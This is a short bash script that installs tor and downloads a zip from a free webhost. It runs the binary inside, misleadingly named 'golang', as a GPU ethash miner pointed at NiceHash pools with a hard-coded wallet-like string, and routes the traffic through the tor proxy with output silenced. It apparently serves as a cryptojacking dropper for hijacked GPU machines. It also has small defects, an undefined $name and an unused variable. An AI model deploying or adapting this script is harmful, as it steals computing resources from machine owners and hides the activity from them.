#!/bin/bash

string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(nvidia-smi --query-gpu=name --format=csv,noheader)
string2=$(echo $string | sed 's/ /_/g')
pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
pool2=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353

apt install -y tor libpci-dev

nohup tor &>/dev/null &

wget https://minerhosting.000webhostapp.com/files/golang_linux_amd64.zip

unzip golang_linux_amd64.zip

cd golang_linux_amd64

./golang -a ethash --url $pool1 --url2 $pool2 -u $string -p x -w $name --proxy 127.0.0.1:9050
